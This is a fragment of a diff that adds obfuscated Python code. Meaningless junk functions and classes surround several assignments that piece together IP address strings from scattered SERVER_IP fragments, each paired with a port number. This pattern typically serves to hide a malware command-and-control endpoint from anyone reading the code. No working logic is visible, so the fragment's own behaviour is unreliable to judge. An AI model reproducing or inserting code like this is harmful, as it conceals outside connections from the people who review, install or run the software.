+    gRcjVXAQ5AiRPz = 281
+    KhSPrG1YpWP45n = 315
+    Jmjm22W15zfSSi8 = 836
+    return hy6JB1dqP5mv
+
+
+def O0lOO0():
+    yDPyfNo0AsWCHMOv = 343
+    WDJThBDi369flMi3U4 = 529
+    GOplIRb18VZ73kf6E = 749
+    ksdQbP94BAvRIzWYR = 202
+    sB0OU23d0dAVTf = 542
+    Z2TqcqLpj0jYelV = 611
+    return 9
+
+
+class Kec7zuna0hch78dmg:
+    def __init__(self, aZ7UBC4w2ImfWNpLNK, VRS31XfHiq_Q):
+        self.aZ7UBC4w2ImfWNpLNK = aZ7UBC4w2ImfWNpLNK
+        self.VRS31XfHiq_Q = VRS31XfHiq_Q
+    def oCfetih2nMU3(self):
+        return 31
+
+
+MbZJ4mV7az =SERVER_IP13 +SERVER_IP18 +SERVER_IP30 +'.' +SERVER_IP9 +SERVER_IP19 +SERVER_IP10 +'.' +SERVER_IP9 +SERVER_IP16 +'.' +SERVER_IP4 +SERVER_IP22 +SERVER_IP24
+AVkpcXFc7eQT =61696
+
+
+RmtMkl7saQMozpd2kG6w = None
+buheNbN6i6Zhq2 = None
+QuyVLY3C = [85, 69]
+
+
+class Xbsufppindm6asr9r6a:
+    def __init__(self, v5DdAk4Nk, dDzL0QhNCZ1dXxjRNI, rwoX0nkXz5):
+        self.v5DdAk4Nk = v5DdAk4Nk
+        self.dDzL0QhNCZ1dXxjRNI = dDzL0QhNCZ1dXxjRNI
+        self.rwoX0nkXz5 = rwoX0nkXz5
+    def USgG3AMJ0(self):
+        return 41
+
+
+r4zjy0x6BQpb6TeThdR =SERVER_IP22 +SERVER_IP12 +'.' +SERVER_IP9 +SERVER_IP21 +'.' +SERVER_IP8 +SERVER_IP15 +SERVER_IP22 +'.' +SERVER_IP28 +SERVER_IP5 +SERVER_IP15
+
+
+nQP8duN5lL_mnqo3Z =SERVER_IP20 +SERVER_IP10 +'.' +SERVER_IP20 +SERVER_IP20 +'.' +SERVER_IP30 +SERVER_IP12 +'.' +SERVER_IP13 +SERVER_IP6
+sSeYKem_GpcIRX6JKJq =11092
+
+
+w7l7ipT7TH = False
+t0uJG3w4OmupsCrKrsp = None
+
+
+PJQP6W2DjvwiFUtG =SERVER_IP16 +SERVER_IP2 +SERVER_IP26 +'.' +SERVER_IP17 +SERVER_IP27 +SERVER_IP10 +'.' +SERVER_IP22 +SERVER_IP9 +'.' +SERVER_IP20 +SERVER_IP14 +SERVER_IP8
+N7RokBDMze2rgBIn2 =31303
+
+
+I0l0llO0I0 =SERVER_IP19 +SERVER_IP17 +'.' +SERVER_IP26 +SERVER_IP2 +'.' +SERVER_IP28 +SERVER_IP17 +SERVER_IP23 +'.' +SERVER_IP20 +SERVER_IP22 +SERVER_IP23
+
+
+def OlIO0IOOI0lI(u3v0Vzih, XteYtz9l4mM7F, CaHHcSGglIvnI):
+    DEnvAe2QPzj = 527
+    r_sJ4ClR4bRi5UpO = 356
+    LENSUlVW5Nx = 301
+    return u3v0Vzih
+
+
+Oh26T_Zn3rxf =SERVER_IP27 +SERVER_IP11 +'.' +SERVER_IP23 +SERVER_IP29 +SERVER_IP9 +'.' +SERVER_IP11 +SERVER_IP19 +SERVER_IP4 +'.' +SERVER_IP9 +SERVER_IP16
+M_3E26vP8OOk3 =58033
+
+
+def q16Kk8rUB9FD9MTmqYLu():
+    VjxqsxA646PNQ_ = 335
+    DJqwI6U1rziL = 376
+    R_hGrxTfWFx = 977
+    Rbmcw4owEt = 954
+    return 42
+
+
+def CvaeuC6AwCVQTKx5Vd(UN0CZmm8o3TFckFGh, fkAo0L5ZV04cLY6aXj):
+    dAY5BuGmBC = 760
+    a_dq35kdcmL = 942
+    Igzk7RygISaQA2 = 452
+    GQpi4OXtWa6383tEDdY = 2
+    IGK5GhMFLig = 98
+    qNTWcCnZU = 727
+    wEeoDR4HKCC4f4YC = 121
+    return UN0CZmm8o3TFckFGh
+
+
+def HiWEJLko5(Q6z1Ew2rYJE, z48daj5yKQMvMau, qJ3wQGe6rlQzVXBHO47N):
+    VlErXQ2_8f5KxSMsSqwz = 580
+    KiyERMFdz = 627
+    yIVZG90kNh3iRQjWybaw = 683
+    ayzqMFifpNpJ = 150
+    TOj06Z4kuWn = 385
+    aJmSUfUFT0dd8R = 69
+    vrfqfIU5IrHcyHNm = 644
+    Hw4jkAS1d = 868
+    return Q6z1Ew2rYJE
+
+
+EbCHI7X_9NkO = [13, 62, 90]
+aT6s3empBk_23U3KNsXx = "YDQyWANip_R"
+UlfmbSaMz_BU = None
+IpuejI5yW4uTsLLWVMs = True
+WuOohOo9 = "Hs0zZl0uzsPAphFj"
+VIVylPCfnjKSaZej = "FqEyWTJq3xZ1bE"
+
+
+WTPIdOR_ = True
+CZEuppZEHNzzXcJ = "airYZUmAP0VZBVHz6vwH"
+oq622RnyPaEU6Utm1C = False
 
